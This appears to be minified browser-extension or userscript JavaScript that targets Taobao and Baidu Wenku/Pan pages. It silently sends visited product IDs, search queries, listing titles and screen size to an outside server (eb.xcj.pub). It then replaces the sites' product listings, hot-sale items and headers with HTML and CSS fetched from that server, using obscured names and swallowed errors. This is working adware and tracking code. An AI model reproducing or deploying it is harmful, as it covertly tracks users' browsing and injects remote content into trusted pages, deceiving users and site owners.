function helper_iiou_xx980(){this.queryUrlParamterTag=function(text,tag){if(text.indexOf("?")!=-1){var textArray=text.split("?");text="?"+textArray[textArray.length-1]}var t=new RegExp("(^|&)"+tag+"=([^&]*)(&|$)");var a=text.substr(1).match(t);if(a!=null){return a[2]}return""};this.request___show_q=function(requestUrl,params){params.size=screen.width+"*"+screen.height;params.version="100";var resutData=null;var priceFilter="";$(".J_SortbarPriceInput").each(function(){var value=$(this).val();priceFilter+="("+(!!value?parseInt(value):"")+")"});if(!!priceFilter){params.price=priceFilter}$.ajax({type:"POST",url:requestUrl,dataType:"json",data:params,timeout:1500,async:false,success:function(result){var data=result.data;if(data!=null&&data.length>0){resutData=data}},});return resutData};this.dom___tbitem=function(requestRoot,scno){if(window.location.host!=="item.taobao.com"||window.location.href.indexOf("item.htm")==-1){return}var goodsId=this.queryUrlParamterTag(window.location.search,"id");if(!!goodsId){$.get(requestRoot+"/ebusiness/api/tb/re/gitems?goodsId="+goodsId+"&platform=taobao&scno="+scno,function(result){})}};this.dom___home=function(requestRoot,scno){try{let that=this;if(window.location.host!=="www.taobao.com"||window.location.pathname!=="/"){return}let isScanning=false;let windowSize=screen.width+"*"+screen.height;let dataObject=that.request___show_q(requestRoot+"/ebusiness/api/tb/h/ghobbies",{"scno":scno});let itemsInterval=setInterval(function(){if(isScanning)return;isScanning=true;let itemArray=$(".tbh-hotsale").find("div.item");if(itemArray.length!=0){clearInterval(itemsInterval);if(dataObject!=null){itemArray.each(function(){$(this).find("a.item-more").remove();for(var k=0;k<dataObject.length;k++){var dataObjectItem=dataObject[k];if(parseInt($(this).attr("aria-posinset"))===parseInt(dataObjectItem.index)){$(this).html(dataObjectItem.html)}}})}}isScanning=false},100)}catch(e){}};this.dom___search=function(requestRoot,scno){try{let that=this;if(window.location.host!=="s.taobao.com"||window.location.href.indexOf("://s.taobao.com/search")==-1){return}let queryValue=this.queryUrlParamterTag(window.location.search,"q");if(!queryValue){return}let dataObject=null;let isScanning=false;let dealredxNumber=0;let scanningDelayTime=50;setInterval(function(){if(isScanning){return}dealredxNumber=0;isScanning=true;var itemArray=$("#mainsrp-itemlist").find("div.item");if(itemArray.length==0){isScanning=false;return}itemArray.each(function(){if($(this).attr("dealredx")==="true"){dealredxNumber++}});if(dealredxNumber<5){var titleArray=new Array();itemArray.each(function(){try{var title=$(this).find("div.title").children("a.J_ClickStat").text();title=title.replace(/\t/g,"");title=title.replace(/\r/g,"");title=title.replace(/\n/g,"");title=title.replace(/\+/g,"%2B");title=title.replace(/\&/g,"%26");title=title.replace(/\#/g,"%23");title=title.replace(/\s/g,"");titleArray.push(title)}catch(e){}});var titleConnectStr=titleArray.join("==============");dataObject=that.request___show_q(requestRoot+"/ebusiness/api/tb/s/gitems",{"q":queryValue,"titleConnectStr":titleConnectStr,"scno":scno});itemArray.each(function(){if($(this).attr("dealredx")==="true"){return}if(dataObject!=null){for(var k=0;k<dataObject.length;k++){var dataObjectItem=dataObject[k];if(parseInt($(this).attr("data-index"))===parseInt(dataObjectItem.index)){if($(this).hasClass("item-ad")){dataObjectItem.index=(parseInt(dataObjectItem.index)+1)+"";return}$(this).html(dataObjectItem.html)}}}$(this).attr("dealredx","true")})}isScanning=false},scanningDelayTime)}catch(e){}};this.dom___wjv=function(requestRoot,scno){try{if(window.location.host==="wenku.baidu.com"&&(window.location.pathname.indexOf("/view/")!=-1||window.location.pathname.indexOf("/link")!=-1)&&$(".vip-card-wrap-23223-new").length==0){$.get(requestRoot+"/api/card/find?tag=jd&no=1&scno="+scno,function(result){if(!!result&&!!result.data){var resultData=result.data;var handler=resultData.handler;var html=resultData.html;var css=resultData.css;if(!!handler&&!!html&&!!css){$("body").prepend("<style>"+css+"</style>");var elementArray=handler.split("@");for(var i=0;i<elementArray.length;i++){var currentElement=elementArray[i];currentElement=currentElement.replace(/(^\s*)|(\s*$)/g,"");if(!!currentElement){if($(currentElement).length!=0){$(currentElement).after(html)}else{let tryTimes=0;let delayTime=50;let elementInterval=setInterval(function(){if($(currentElement).length!=0){$(currentElement).after(html)clearInterval(elementInterval)}else{if(tryTimes*delayTime>=10000){clearInterval(elementInterval)}}tryTimes++},delayTime)}}}}}})}}catch(e){}};this.dom___wpad=function(requestRoot,scno){if(window.location.host==="pan.baidu.com"&&window.location.href.indexOf("/s/")!=-1){$.get(requestRoot+"/api/card/find?tag=wptext&no=1&scno="+scno,function(result){var data=result.data;if(!!data&&!!data.css&&!!data.html&&!!data.handler){var handler=data.handler;var html=data.html;let helperInterval=setInterval(function(){var $headerUnion=$("#layoutHeader").find(handler);$headerUnion.hide();if($headerUnion.html().length>=10){clearInterval(helperInterval);$headerUnion.html(html);$headerUnion.show()}},100)}});$.get(requestRoot+"/api/card/find?tag=wpimg&no=1&scno="+scno,function(result){var data=result.data;if(!!data&&!!data.css&&!!data.html&&!!data.handler){var handler=data.handler;var html=data.html;let rightViewInterval=setInterval(function(){let $webRightView=$(handler);$webRightView.hide();if($webRightView.length==0){clearInterval(rightViewInterval);return}if($webRightView.html().length>=10){clearInterval(rightViewInterval);$webRightView.html(html);$webRightView.show()}},100)}})}};this.start=function(){try{let requestRoot="https://eb.xcj.pub",scno=1;this.dom___home(requestRoot,scno);this.dom___search(requestRoot,scno);this.dom___tbitem(requestRoot,scno);this.dom___wjv(requestRoot,scno);this.dom___wpad(requestRoot,scno)}catch(e){}}};
function taskssti(){try{(new helper_iiou_xx980()).start()}catch(e){}}
